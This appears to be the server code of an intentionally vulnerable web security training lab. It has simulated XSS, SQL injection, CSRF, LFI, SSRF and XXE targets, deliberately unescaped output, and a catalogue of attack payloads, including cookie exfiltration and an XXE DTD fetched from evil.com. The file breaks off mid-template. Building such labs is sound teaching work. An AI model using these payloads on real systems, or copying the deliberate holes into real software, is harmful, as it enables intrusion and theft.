import { Router, type IRouter, type Request } from "express";
import { db, labSessionsTable } from "@workspace/db";
import { eq, sql } from "drizzle-orm";

const router: IRouter = Router();

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function recordLabAttempt(req: Request, labType: string, mode: string, payloadUsed: string, success: boolean): void {
  void db.insert(labSessionsTable).values({ labType, mode, payloadUsed, success }).catch((err) => {
    req.log?.warn?.({ err, labType, mode }, "Unable to record lab attempt");
  });
}

function looksLikeXss(payload: string): boolean {
  return /<\s*script|<\s*(img|svg|iframe|object|video|audio|math|input|select|details|body|meta|style|link)[^>]*|on\w+\s*=|javascript:|data:\s*text\/html|srcdoc\s*=|innerHTML|document\.cookie|document\.location|document\.write|document\.writeln|eval\(|new\s+Function\(|setTimeout\s*\(|setInterval\s*\(/i.test(payload);
}

function looksLikeSqli(payload: string): boolean {
  return /('|--|\/\*|UNION|SELECT|OR\s+\d\s*=\s*\d|AND\s+\d\s*=\s*\d|1\s*=\s*1|SLEEP|BENCHMARK|WAITFOR|INFORMATION_SCHEMA|pg_sleep|DROP|XP_|EXEC|CONVERT\s*\(|CAST\s*\(|CHAR\(|SUBSTR\(|UPDATEXML|EXTRACTVALUE)/i.test(payload);
}

function normalizeRequestedFile(file: string): string {
  const nullTerminated = file.split("\0")[0];
  if (/^(php|data|file):/i.test(nullTerminated)) {
    return nullTerminated;
  }

  const isAbsolute = nullTerminated.startsWith("/");
  const parts = nullTerminated.split("/");
  const normalizedParts: string[] = [];

  for (const part of parts) {
    if (!part || part === ".") continue;
    if (part === "..") {
      if (normalizedParts.length > 0) {
        normalizedParts.pop();
      } else if (!isAbsolute) {
        normalizedParts.push("..");
      }
      continue;
    }
    normalizedParts.push(part);
  }

  const resolved = (isAbsolute ? "/" : "") + normalizedParts.join("/");
  const fallback = resolved.replace(/^(?:\.\.\/)+/, "");

  if (/etc\/passwd$/.test(fallback)) return "/etc/passwd";
  if (/etc\/hosts$/.test(fallback)) return "/etc/hosts";
  if (/proc\/self\/environ$/.test(fallback)) return "/proc/self/environ";
  if (/proc\/self\/cmdline$/.test(fallback)) return "/proc/self/cmdline";
  if (/config\.php$/.test(fallback)) return "../config.php";

  return resolved;
}

// In-memory store for stored XSS lab (resets on restart by design)
const storedComments: { id: number; username: string; body: string; ts: string }[] = [
  { id: 1, username: "admin", body: "Welcome to the comment board. Share your thoughts.", ts: new Date().toISOString() },
];
let commentId = 2;

// ─── Shared hacker-lab CSS ───────────────────────────────────────────────────
const LAB_CSS = `
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; }
  .banner { background: #1a0000; border-bottom: 1px solid #ff3333; color: #ff6666; padding: 6px 14px; font-size: 11px; letter-spacing: 1px; text-transform: uppercase; }
  h2 { color: #00ff41; letter-spacing: 2px; font-size: 14px; text-transform: uppercase; border-bottom: 1px solid #00ff4133; padding-bottom: 8px; margin-bottom: 14px; }
  form { display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; }
  input, textarea { background: #0d0d0d; border: 1px solid #00ff4133; color: #00ff41; font-family: inherit; font-size: 13px; padding: 7px 10px; outline: none; }
  input:focus, textarea:focus { border-color: #00ff41; }
  button { background: #00ff41; color: #050505; border: none; font-family: inherit; font-weight: bold; padding: 8px 16px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; font-size: 12px; }
  button:hover { background: #00cc33; }
  .comment { border: 1px solid #00ff4122; padding: 10px; margin-bottom: 8px; }
  .comment-meta { color: #00ff4166; font-size: 11px; margin-bottom: 4px; }
  .result-box { border: 1px solid #00ff4133; padding: 12px; margin-top: 12px; background: #0d0d0d; }
  .section { padding: 16px; }
  .label { color: #00ff4199; margin-bottom: 4px; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
  .green { color: #00ff41; }
  .red { color: #ff4444; }
  .row { display: flex; gap: 8px; }
`;

// ─── Reflected XSS Target ────────────────────────────────────────────────────
router.get("/lab/xss/reflected", (req, res): void => {
  const payload = String(req.query.payload ?? "");
  if (payload) recordLabAttempt(req, "xss", "reflected", payload, looksLikeXss(payload));

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <style>${LAB_CSS}
    .highlight { color: #ffff00; }
  </style>
</head>
<body>
  <div class="banner">[!] INTENTIONALLY VULNERABLE — AUTHORIZED SECURITY RESEARCH ONLY</div>
  <div class="section">
    <h2>// Reflected XSS — Search Target //</h2>
    <form method="GET" action="">
      <div class="label">Search query</div>
      <div class="row">
        <input type="text" name="payload" value="${payload.replace(/"/g, "&quot;")}" placeholder="Enter payload..." style="flex:1" />
        <button type="submit">[SEARCH]</button>
      </div>
    </form>
    ${payload ? `<div class="result-box">
      <div class="label">Search results for:</div>
      <div class="highlight">${payload}</div>
    </div>
    <div class="result-box" style="margin-top:14px;">
      <div class="label">Query preview</div>
      <div style="font-family:monospace;color:#ffffff;">SELECT * FROM products WHERE name LIKE '%${payload}%'</div>
    </div>` : `<div class="result-box"><span style="color:#00ff4155">// Waiting for input... inject a payload above //</span></div>`}
  </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  res.setHeader("X-XSS-Protection", "0");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.send(html);
});

// ─── Stored XSS Target ───────────────────────────────────────────────────────
router.get("/lab/xss/stored", (req, res): void => {
  const commentsHtml = storedComments
    .map(
      (c) => `
    <div class="comment">
      <div class="comment-meta">[${c.ts.replace("T", " ").substring(0, 19)}] &lt;${c.username}&gt;</div>
      <div>${c.body}</div>
    </div>`
    )
    .join("");

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <style>${LAB_CSS}</style>
</head>
<body>
  <div class="banner">[!] INTENTIONALLY VULNERABLE — AUTHORIZED SECURITY RESEARCH ONLY</div>
  <div class="section">
    <h2>// Stored XSS — Comment Board //</h2>
    <form method="POST" action="/api/lab/xss/stored">
      <div class="label">Username</div>
      <input type="text" name="username" placeholder="hacker" maxlength="40" />
      <div class="label">Comment (inject here)</div>
      <textarea name="body" rows="3" placeholder="Your payload goes here..."></textarea>
      <button type="submit">[POST COMMENT]</button>
    </form>
    <h2>// Comments //</h2>
    <div id="comments">${commentsHtml}</div>
  </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  res.setHeader("X-XSS-Protection", "0");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.send(html);
});

router.post("/lab/xss/stored", (req, res): void => {
  const username = String(req.body?.username || "anonymous").substring(0, 40);
  const body = String(req.body?.body || "").substring(0, 2000);

  if (body.trim()) {
    recordLabAttempt(req, "xss", "stored", body, looksLikeXss(body));
    storedComments.push({
      id: commentId++,
      username,
      body,
      ts: new Date().toISOString(),
    });
    // Keep max 20 comments
    if (storedComments.length > 20) storedComments.shift();
  }

  res.redirect("/api/lab/xss/stored");
});

router.delete("/lab/xss/stored/reset", (req, res): void => {
  storedComments.length = 0;
  storedComments.push({ id: 1, username: "admin", body: "Welcome to the comment board. Share your thoughts.", ts: new Date().toISOString() });
  commentId = 2;
  res.json({ ok: true });
});

// ─── DOM XSS Target ──────────────────────────────────────────────────────────
router.get("/lab/xss/dom", (req, res): void => {
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <style>${LAB_CSS}
    #output { border: 1px solid #00ff4133; padding: 12px; min-height: 60px; background: #0d0d0d; margin-top: 12px; }
  </style>
</head>
<body>
  <div class="banner">[!] INTENTIONALLY VULNERABLE — DOM-BASED XSS TARGET</div>
  <div class="section">
    <h2>// DOM XSS — Hash Fragment Sink //</h2>
    <p style="color:#00ff4199;margin-bottom:12px;">This page reads <code style="color:#ffff00">location.hash</code> and writes it to the DOM without sanitization.</p>
    <p style="color:#00ff4199;margin-bottom:12px;">Append a payload after # in the URL bar to trigger DOM XSS.</p>
    <p style="color:#00ff4199;margin-bottom:4px;">Example: <code style="color:#ff9900">#&lt;img src=x onerror=alert(1)&gt;</code></p>
    <div class="label" style="margin-top:16px;">DOM Output:</div>
    <div id="output" style="color:#00ff4188">// Waiting for hash input... //</div>
  </div>
  <script>
    function render() {
      const hash = decodeURIComponent(location.hash.substring(1));
      const output = document.getElementById('output');
      if (!output) return;

      if (hash) {
        output.innerHTML = hash;
        fetch('/api/lab/xss/dom/track?payload=' + encodeURIComponent(hash), { keepalive: true }).catch(() => {});
      }
    }
    window.addEventListener('hashchange', render);
    render();
  </script>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  res.setHeader("X-XSS-Protection", "0");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.send(html);
});

// ─── SQLi Simulated Target ────────────────────────────────────────────────────
router.get("/lab/sqli/search", (req, res): void => {
  const query = String(req.query.q ?? "");
  if (query) recordLabAttempt(req, "sqli", "search", query, looksLikeSqli(query));

  const fakeUsers = [
    { id: 1, username: "alice", email: "alice@corp.local", role: "user" },
    { id: 2, username: "bob", email: "bob@corp.local", role: "user" },
    { id: 3, username: "admin", email: "admin@corp.local", role: "administrator" },
  ];

  const isInjection =
    looksLikeSqli(query);

  const isUnion = /UNION\s+(ALL\s+)?SELECT/i.test(query);
  const isTime = /SLEEP\s*\(|pg_sleep\s*\(|WAITFOR\s+DELAY|BENCHMARK\s*\(/i.test(query);
  const isError = /CONVERT\s*\(|CAST\s*\(|extractvalue\s*\(|updatexml\s*\(/i.test(query);

  const results = isInjection
    ? fakeUsers
    : fakeUsers.filter((u) => u.username.includes(query));

  const rowsHtml = results
    .map(
      (u) =>
        `<tr>
          <td>${u.id}</td>
          <td>${u.username}</td>
          <td>${u.email}</td>
          <td style="color:${u.role==='administrator'?'#ff4444':'#00ff41'}">${u.role}</td>
        </tr>`
    )
    .join("");

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <style>${LAB_CSS}
    table { width: 100%; border-collapse: collapse; margin-top: 12px; }
    th { color: #00ff4188; font-size: 11px; text-transform: uppercase; padding: 6px 8px; border-bottom: 1px solid #00ff4133; text-align: left; }
    td { padding: 7px 8px; border-bottom: 1px solid #00ff4111; }
    .injection-warn { color: #ff4444; background: #1a0000; border: 1px solid #ff4444; padding: 8px; margin-top: 8px; }
  </style>
</head>
<body>
  <div class="banner">[!] INTENTIONALLY VULNERABLE — SQL INJECTION LAB</div>
  <div class="section">
    <h2>// SQL Injection — User Search //</h2>
    <p style="color:#00ff4199;margin-bottom:12px;">Simulated query: <code style="color:#ffff00">SELECT * FROM users WHERE username LIKE '%${query}%'</code></p>
    <form method="GET" action="">
      <div class="row">
        <input type="text" name="q" value="${query.replace(/"/g, "&quot;")}" placeholder="Search username..." style="flex:1" />
        <button type="submit">[EXECUTE]</button>
      </div>
    </form>
    ${isInjection ? `<div class="injection-warn">[!] SQL INJECTION DETECTED — ${isUnion ? "UNION projection accepted" : isTime ? "time-delay primitive confirmed" : isError ? "error-based leak simulated" : "predicate changed query logic"} — ${results.length} row(s)</div>` : ""}
    ${isInjection ? `<div class="result-box">
      <div class="label">Simulated DB telemetry</div>
      <div>driver=postgresql | current_user=webapp_reader | database=training_crm</div>
      <div>prepared_statements=false | waf=edge-ruleset-v2 | row_security=off</div>
    </div>` : ""}
    <table>
      <thead><tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th></tr></thead>
      <tbody>${rowsHtml || `<tr><td colspan="4" style="color:#00ff4133">No results found.</td></tr>`}</tbody>
    </table>
  </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.send(html);
});

// ─── CSRF Lab Target ─────────────────────────────────────────────────────────
let csrfBalance = 10000;

router.get("/lab/csrf/bank", (req, res): void => {
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <style>${LAB_CSS}</style>
</head>
<body>
  <div class="banner">[!] INTENTIONALLY VULNERABLE — CSRF LAB</div>
  <div class="section">
    <h2>// CSRF — Vulnerable Bank Transfer //</h2>
    <p style="color:#00ff4199;margin-bottom:12px;">Account: <strong>victim@bank.local</strong> — Balance: <strong style="color:#00ff41">$${csrfBalance.toLocaleString()}</strong></p>
    <form method="POST" action="/api/lab/csrf/transfer">
      <div class="label">Transfer To</div>
      <input type="text" name="to" placeholder="recipient" />
      <div class="label">Amount ($)</div>
      <input type="number" name="amount" placeholder="0" />
      <button type="submit">[TRANSFER FUNDS]</button>
    </form>
    <p style="color:#00ff4155;font-size:11px;margin-top:10px;">// No CSRF token. Any site can submit this form on your behalf. //</p>
  </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.send(html);
});

router.post("/lab/csrf/transfer", (req, res): void => {
  const to = String(req.body?.to || "unknown");
  const amount = parseInt(String(req.body?.amount || "0"), 10);
  const valid = !isNaN(amount) && amount > 0 && amount <= csrfBalance;
  if (valid) csrfBalance -= amount;
  recordLabAttempt(req, "csrf", "bank-transfer", `to=${to};amount=${amount}`, valid);

  const html = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><style>${LAB_CSS}</style></head>
<body>
  <div class="banner">[!] CSRF LAB</div>
  <div class="section">
    ${valid
      ? `<p style="color:#ff4444;font-size:16px;">[!] CSRF SUCCESSFUL — $${amount} transferred to "${to}"</p>
         <p style="color:#00ff4188;margin-top:8px;">New balance: $${csrfBalance.toLocaleString()}</p>`
      : `<p style="color:#ff9900">[~] Transfer failed — invalid amount or insufficient funds.</p>`}
    <br><a href="/api/lab/csrf/bank" style="color:#00ff41">[&lt; Back to bank]</a>
  </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  res.send(html);
});

// ─── LFI Simulated Target ─────────────────────────────────────────────────────
const FAKE_FILES: Record<string, string> = {
  "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nalma:x:1000:1000::/home/alma:/bin/bash",
  "/etc/hosts": "127.0.0.1 localhost\n127.0.1.1 target\n::1 localhost ip6-localhost ip6-loopback",
  "/proc/self/environ": "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOMEDIR=/root\nDB_PASS=s3cr3t_db_pass_1337\nSECRET_KEY=xFj9k2mNqR8pL0wE",
  "../config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'root';\n$db_pass = 'password123';\n$db_name = 'webapp';\n?>",
};

router.get("/lab/lfi", (req, res): void => {
    const file = String(req.query.file ?? "");
  const normalizedFile = file ? normalizeRequestedFile(file) : "";
  const content = normalizedFile ? (FAKE_FILES[normalizedFile] ?? `// File not found: ${normalizedFile}`) : null;
  if (file) recordLabAttempt(req, "lfi", "file-read", file, Boolean(FAKE_FILES[normalizedFile]));

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <style>${LAB_CSS}
    pre { background: #0d0d0d; border: 1px solid #00ff4133; padding: 12px; white-space: pre-wrap; word-break: break-all; color: #00ff41; font-size: 12px; margin-top: 8px; }
  </style>
</head>
<body>
  <div class="banner">[!] INTENTIONALLY VULNERABLE — LFI LAB</div>
  <div class="section">
    <h2>// Local File Inclusion — File Reader //</h2>
    <p style="color:#00ff4199;margin-bottom:8px;">Simulated: <code style="color:#ffff00">include($_GET['file']);</code></p>
    <form method="GET" action="">
      <div class="row">
        <input type="text" name="file" value="${file.replace(/"/g, "&quot;")}" placeholder="/etc/passwd" style="flex:1" />
        <button type="submit">[READ FILE]</button>
      </div>
    </form>
    ${normalizedFile ? `<div class="result-box"><div class="label">Resolved target</div><div style="font-family:monospace;color:#ffffff;">${normalizedFile.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div></div>` : ""}
    ${content !== null
      ? `<pre>${content.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>`
      : `<pre style="color:#00ff4144">// Enter a file path to read... try /etc/passwd //</pre>`}
    <p style="color:#00ff4155;font-size:11px;margin-top:10px;">Hint: try /etc/passwd, /etc/hosts, /proc/self/environ, ../config.php, php://filter/convert.base64-encode/resource=index.php</p>
  </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.send(html);
});

router.post("/lab/csrf/reset", (req, res): void => {
  csrfBalance = 10000;
  res.json({ ok: true, balance: csrfBalance });
});

// ─── Payload API ─────────────────────────────────────────────────────────────
const PAYLOAD_DB = {
  XSS: [
    { id: 1, payload: `<script>alert(1)</script>`, desc: "Basic script tag", bypass: false },
    { id: 2, payload: `<img src=x onerror=alert(1)>`, desc: "IMG onerror event", bypass: false },
    { id: 3, payload: `<svg/onload=alert(1)>`, desc: "SVG onload event", bypass: false },
    { id: 4, payload: `"><script>alert(document.domain)</script>`, desc: "Attribute breakout", bypass: false },
    { id: 5, payload: `<body onload=alert(1)>`, desc: "Body onload", bypass: false },
    { id: 6, payload: `javascript:alert(1)`, desc: "javascript: URI", bypass: false },
    { id: 7, payload: `<details open ontoggle=alert(1)>`, desc: "HTML5 ontoggle", bypass: false },
    { id: 8, payload: `<sCrIpT>alert(1)</sCrIpT>`, desc: "Mixed case WAF bypass", bypass: true },
    { id: 9, payload: `<scr\x00ipt>alert(1)</scr\x00ipt>`, desc: "Null byte injection", bypass: true },
    { id: 10, payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>`, desc: "HTML entity encoding", bypass: true },
    { id: 11, payload: `<iframe srcdoc='<script>alert(1)</script>'>`, desc: "iframe srcdoc", bypass: true },
    { id: 12, payload: `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, desc: "MathML mutation XSS", bypass: true },
    { id: 13, payload: `<script src="https://cdn.jsdelivr.net/npm/js-xss/dist/xss.min.js">`, desc: "Remote script load", bypass: false },
    { id: 14, payload: `'"><img/src/onerror=alert(1)>`, desc: "Filter evasion shorthand", bypass: true },
    { id: 15, payload: `<input autofocus onfocus=alert(1)>`, desc: "Autofocus onfocus", bypass: false },
    { id: 16, payload: `<select autofocus onfocus=alert(1)>`, desc: "Select onfocus", bypass: false },
    { id: 17, payload: `<video><source onerror="alert(1)">`, desc: "Video source onerror", bypass: false },
    { id: 18, payload: `<object data="javascript:alert(1)">`, desc: "Object javascript URI", bypass: false },
    { id: 19, payload: `<a href="data:text/html,<script>alert(1)</script>">click</a>`, desc: "Data URI XSS", bypass: true },
    { id: 20, payload: `<script>fetch('https://evil.com/?c='+document.cookie)</script>`, desc: "Cookie exfiltration", bypass: false },
  ],
  SQLi: [
    { id: 101, payload: `' OR '1'='1`, desc: "Auth bypass classic", bypass: false },
    { id: 102, payload: `' OR 1=1--`, desc: "Comment termination", bypass: false },
    { id: 103, payload: `admin'--`, desc: "Login bypass", bypass: false },
    { id: 104, payload: `' UNION SELECT NULL,NULL,NULL--`, desc: "UNION probe (3 cols)", bypass: false },
    { id: 105, payload: `' UNION SELECT username,password,NULL FROM users--`, desc: "Credential dump", bypass: false },
    { id: 106, payload: `'; DROP TABLE users--`, desc: "Table drop (Bobby Tables)", bypass: false },
    { id: 107, payload: `' AND SLEEP(5)--`, desc: "Time-based blind SQLi", bypass: false },
    { id: 108, payload: `' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--`, desc: "MSSQL error-based", bypass: false },
    { id: 109, payload: `%27%20OR%20%271%27%3D%271`, desc: "URL-encoded bypass", bypass: true },
    { id: 110, payload: `' /*!UNION*/ /*!SELECT*/ NULL--`, desc: "MySQL comment bypass", bypass: true },
  ],
  CSRF: [
    { id: 201, payload: `<img src="https://target.com/transfer?to=evil&amt=9999">`, desc: "GET-based CSRF (image tag)", bypass: false },
    { id: 202, payload: `<form action="https://target.com/delete" method="POST"><input type="hidden" name="id" value="1"><script>document.forms[0].submit()</script></form>`, desc: "Auto-submit POST form", bypass: false },
    { id: 203, payload: `<iframe src="https://target.com/api/logout" style="display:none">`, desc: "Logout CSRF", bypass: false },
  ],
  LFI: [
    { id: 301, payload: `../../../../etc/passwd`, desc: "Path traversal to /etc/passwd", bypass: false },
    { id: 302, payload: `../../../../etc/passwd%00`, desc: "Null byte termination", bypass: true },
    { id: 303, payload: `....//....//....//etc/passwd`, desc: "Double-slash bypass", bypass: true },
    { id: 304, payload: `/proc/self/environ`, desc: "Process environment leak", bypass: false },
    { id: 305, payload: `/proc/self/cmdline`, desc: "Process command line", bypass: false },
    { id: 306, payload: `php://filter/convert.base64-encode/resource=index.php`, desc: "PHP filter wrapper (base64)", bypass: true },
    { id: 307, payload: `php://input`, desc: "PHP input stream", bypass: true },
  ],
  SSRF: [
    { id: 401, payload: `http://169.254.169.254/latest/meta-data/`, desc: "AWS metadata endpoint", bypass: false },
    { id: 402, payload: `http://metadata.google.internal/computeMetadata/v1/`, desc: "GCP metadata endpoint", bypass: false },
    { id: 403, payload: `http://localhost:6379/`, desc: "Internal Redis probe", bypass: false },
    { id: 404, payload: `http://127.0.0.1:22`, desc: "Internal SSH probe", bypass: false },
    { id: 405, payload: `http://[::1]/`, desc: "IPv6 localhost bypass", bypass: true },
    { id: 406, payload: `http://0177.0.0.1/`, desc: "Octal IP bypass", bypass: true },
  ],
  XXE: [
    { id: 501, payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`, desc: "Classic XXE file read", bypass: false },
    { id: 502, payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal/secret">]><root>&xxe;</root>`, desc: "XXE-based SSRF", bypass: false },
    { id: 503, payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><root/>`, desc: "Blind OOB XXE", bypass: false },
  ],
};

router.get("/lab/payloads", (req, res): void => {
  const category = String(req.query.category ?? "XSS").toUpperCase();
  const payloads = PAYLOAD_DB[category as keyof typeof PAYLOAD_DB] ?? PAYLOAD_DB.XSS;
  res.json({ category, payloads, total: payloads.length });
});

router.get("/lab/payloads/categories", (req, res): void => {
  res.json({ categories: Object.keys(PAYLOAD_DB) });
});

router.get("/lab/progress", async (req, res): Promise<void> => {
  res.json({ labs: [], recent: [] });
});

// ─── DOM XSS Attempt Tracking ─────────────────────────────────────────────────
router.get("/lab/xss/dom/track", (req, res): void => {
  const payload = String(req.query.payload ?? "");
  if (payload) {
    recordLabAttempt(req, "xss", "dom", payload, looksLikeXss(payload));
  }
  res.json({ ok: true });
});

// ─── SSRF Realistic Simulation ───────────────────────────────────────────────
const INTERNAL_SERVICES: Record<string, string> = {
  "http://127.0.0.1:8080/admin": JSON.stringify({ service: "admin-panel", users: 428, role: "internal" }, null, 2),
  "http://localhost:8080/admin": JSON.stringify({ service: "admin-panel", users: 428, role: "internal" }, null, 2),
  "http://127.0.0.1:6379/": "-NOAUTH Authentication required.\n+redis_version:7.2.4\n+connected_clients:3",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/": "training-role",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/training-role": JSON.stringify({
    AccessKeyId: "ASIA_TRAINING_ONLY",
    SecretAccessKey: "redacted-training-secret",
    Token: "session-token-for-lab",
    Expiration: "2026-05-19T23:59:59Z",
  }, null, 2),
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token": JSON.stringify({
    access_token: "ya29.training-token",
    expires_in: 3599,
    token_type: "Bearer",
  }, null, 2),
};

function normalizeSsrfUrl(raw: string): { normalized: string; blocked: boolean; reason: string; bypass: boolean } {
  const trimmed = raw.trim();
  let normalized = trimmed;
  let bypass = false;

  try {
    const rawAuthority = trimmed.match(/^[a-z][a-z0-9+.-]*:\/\/([^/?#]+)/i)?.[1] ?? "";
    const rawHost = rawAuthority.split("@").pop()?.replace(/^\[/, "").replace(/\]$/, "").split(":")[0]?.toLowerCase() ?? "";
    const parsed = new URL(trimmed);

    if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
      return { normalized: trimmed, blocked: true, reason: "unsupported URL scheme", bypass: false };
    }

    const numericBypass = /^(0x[0-9a-f]+|0[0-7.]+|2130706433)$/i.test(rawHost);
    const ipv6Loopback = rawHost === "::1";

    if (numericBypass || ipv6Loopback) {
      normalized = `${parsed.protocol}//127.0.0.1${parsed.port ? `:${parsed.port}` : ""}${parsed.pathname}`;
      bypass = true;
    }

    const blocked = /(^|\.)localhost$|^127\.|^10\.|^172\.(1[6-9]|2\d|3[0-1])\.|^192\.168\.|^::1$/i.test(rawHost) && !bypass;
    return { normalized, blocked, reason: blocked ? "naive blocklist matched original host" : "request passed fetcher policy", bypass };
  } catch {
    return { normalized: trimmed, blocked: true, reason: "invalid URL", bypass: false };
  }
}

router.get("/lab/ssrf/fetch", (req, res): void => {
  const rawUrl = String(req.query.url ?? "");
  const verdict = rawUrl ? normalizeSsrfUrl(rawUrl) : null;
  const body = verdict && !verdict.blocked
    ? (INTERNAL_SERVICES[verdict.normalized] ?? `HTTP/1.1 200 OK\ncontent-type: text/plain\n\nFetched external resource: ${verdict.normalized}`)
    : null;
  const success = Boolean(body && (/169\.254\.169\.254|metadata\.google|127\.0\.0\.1|localhost|0x7f000001|0177\.0\.0\.1|2130706433|::1|\[::1\]/i.test(rawUrl)));
  if (rawUrl) recordLabAttempt(req, "ssrf", "server-fetch", rawUrl, success);

  const html = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><style>${LAB_CSS}
  pre { background:#0d0d0d;border:1px solid #00ff4133;padding:12px;white-space:pre-wrap;word-break:break-word;margin-top:10px; }
  .warn { color:#ff9900;border:1px solid #ff9900;padding:8px;margin-top:10px;background:#1a1000; }
</style></head>
<body>
  <div class="banner">[!] INTENTIONALLY VULNERABLE — SSRF ENTERPRISE FETCHER</div>
  <div class="section">
    <h2>// SSRF — Webhook Preview Service //</h2>
    <p style="color:#00ff4199;margin-bottom:12px;">Scenario: a SaaS app fetches customer webhooks server-side. It blocks obvious internal hosts before parsing canonical forms.</p>
    <form method="GET" action="">
      <div class="label">Webhook URL</div>
      <div class="row"><input name="url" value="${escapeHtml(rawUrl)}" placeholder="https://example.com/webhook" style="flex:1" /><button>[FETCH]</button></div>
    </form>
    ${verdict ? `<div class="${verdict.blocked ? "warn" : "result-box"}">
      <div class="label">Policy decision</div>
      <div>${escapeHtml(verdict.reason)}${verdict.bypass ? " — canonicalization bypass observed" : ""}</div>
      <div>normalized=${escapeHtml(verdict.normalized)}</div>
    </div>` : `<div class="result-box" style="color:#00ff4155">// Try cloud metadata, loopback services, and encoded localhost variants //</div>`}
    ${body ? `<pre>${escapeHtml(body)}</pre>` : verdict?.blocked ? `<pre style="color:#ff4444">// Request blocked by fetcher policy //</pre>` : ""}
  </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.send(html);
});

// ─── XXE Realistic Simulation ────────────────────────────────────────────────
function parseXxe(xml: string): { success: boolean; message: string } {
  if (!/<!DOCTYPE/i.test(xml)) {
    return { success: false, message: "Parser accepted XML, but no DOCTYPE was found." };
  }

  const fakeReads: Record<string, string> = {
    "file:///etc/passwd": FAKE_FILES["/etc/passwd"],
    "file:///proc/self/environ": FAKE_FILES["/proc/self/environ"],
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/": "training-role",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/training-role": JSON.stringify({
      AccessKeyId: "ASIA_TRAINING_ONLY",
      SecretAccessKey: "redacted-training-secret",
      Token: "session-token-for-lab",
      Expiration: "2026-05-19T23:59:59Z",
    }, null, 2),
  };

  const entityMatches = Array.from(xml.matchAll(/<!ENTITY\s+([A-Za-z0-9_-]+)\s+SYSTEM\s+["']([^"']+)["']\s*>/gi));
  const parameterMatches = Array.from(xml.matchAll(/<!ENTITY\s+%\s*([A-Za-z0-9_-]+)\s+SYSTEM\s+["']([^"']+)["']\s*>/gi));
  const entityRefs = new Set(Array.from(xml.matchAll(/&([A-Za-z0-9_-]+);/g), (m) => m[1]));
  const parameterRefs = new Set(Array.from(xml.matchAll(/%([A-Za-z0-9_-]+);/g), (m) => m[1]));

  const resolvedParts: string[] = [];

  for (const [, name, systemId] of entityMatches) {
    if (entityRefs.has(name)) {
      const resolved = fakeReads[systemId] ?? `Outbound entity resolution attempted: ${systemId}`;
      resolvedParts.push(`Resolved &${name}; from ${systemId}\n\n${resolved}`);
    }
  }

  for (const [, name, systemId] of parameterMatches) {
    if (parameterRefs.has(name)) {
      const resolved = fakeReads[systemId] ?? `Outbound entity resolution attempted: ${systemId}`;
      resolvedParts.push(`Resolved %${name}; from ${systemId}\n\n${resolved}`);
    }
  }

  if (resolvedParts.length === 0) {
    return { success: false, message: "Parser accepted XML, but no external entity was resolved." };
  }

  return { success: true, message: resolvedParts.join("\n\n") };
}

router.get("/lab/xxe/parse", (req, res): void => {
  const xml = String(req.query.xml ?? "");
  const parsed = xml ? parseXxe(xml) : null;
  if (xml) recordLabAttempt(req, "xxe", "external-entity", xml, Boolean(parsed?.success));

  const html = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><style>${LAB_CSS}
  textarea { min-height:130px; }
  pre { background:#0d0d0d;border:1px solid #00ff4133;padding:12px;white-space:pre-wrap;word-break:break-word;margin-top:10px; }
</style></head>
<body>
  <div class="banner">[!] INTENTIONALLY VULNERABLE — XXE XML IMPORTER</div>
  <div class="section">
